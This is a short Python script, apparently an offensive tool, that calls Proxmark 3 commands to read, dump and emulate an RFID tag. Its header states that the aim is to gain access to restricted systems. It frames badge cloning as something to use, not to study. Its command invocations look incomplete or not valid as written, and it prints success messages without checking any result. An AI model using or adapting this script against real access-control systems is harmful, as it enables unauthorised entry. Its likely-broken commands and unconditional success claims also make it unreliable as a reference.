# -------------------------------------------
# RFID Tag Cloning Using Proxmark 3
# -------------------------------------------
# Functionality:
# - Reads an RFID tag and stores the information.
# - Clones the RFID tag and allows you to emulate it to gain access to restricted systems.

# Devices being used:
# - Proxmark 3: Captures and clones RFID tag data.

# Example Usage:
# 1. Run the script to read an RFID tag and then clone it:
#    python rfid_tag_cloning.py

import subprocess

def read_rfid_tag():
    """
    Reads the RFID tag information using Proxmark 3.
    This function captures the data from the RFID tag to clone.
    """
    print("[+] Scanning for RFID tag...")
    subprocess.run(["proxmark3", "hf", "search"])  # Scan for the RFID tag
    subprocess.run(["proxmark3", "hf", "dump"])  # Dump the RFID tag data
    print("[✔] RFID tag read successfully.")

def clone_rfid_tag():
    """
    Clones the RFID tag by emulating the captured tag data.
    This function emulates the RFID tag for use in an access control system.
    """
    print("[+] Cloning the RFID tag...")
    subprocess.run(["proxmark3", "hf", "emulate"])  # Emulate the RFID tag
    print("[✔] RFID tag cloned and emulated successfully.")

def main():
    """
    Main function to handle the reading and cloning of an RFID tag.
    """
    read_rfid_tag()  # Read the RFID tag
    clone_rfid_tag()  # Clone the RFID tag and emulate it

# Run the script
if __name__ == "__main__":
    main()
